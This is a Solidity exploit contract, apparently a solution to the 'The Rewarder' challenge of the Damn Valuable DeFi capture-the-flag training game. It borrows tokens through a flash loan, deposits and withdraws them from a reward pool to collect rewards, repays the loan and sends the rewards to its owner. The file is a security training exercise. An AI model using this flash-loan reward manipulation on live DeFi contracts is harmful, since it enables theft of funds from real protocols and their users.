// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.15;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract AttackerReward {
    address payable private immutable owner;

    FlashLoanerPool pool;
    TheRewarderPool rewardPool;

    DamnValuableToken public immutable liquidityToken;

    constructor(
        address _owner,
        address _poolAddress,
        address _rewardPoolAddress, 
        address _liquidityTokenAddress
    ) {
        owner = payable(_owner);
        pool = FlashLoanerPool(_poolAddress);
        rewardPool = TheRewarderPool(_rewardPoolAddress);
        liquidityToken = DamnValuableToken(_liquidityTokenAddress);
    }

    function attack(uint256 _amount) external {
        pool.flashLoan(_amount);
    }

    function receiveFlashLoan(uint256 _amount) external {
        liquidityToken.approve(address(rewardPool), _amount);

        rewardPool.deposit(_amount);
        rewardPool.withdraw(_amount);
        
        liquidityToken.transfer(address(pool), _amount);

        uint256 currBal = rewardPool.rewardToken().balanceOf(address(this));
        rewardPool.rewardToken().transfer(owner, currBal);
    }
}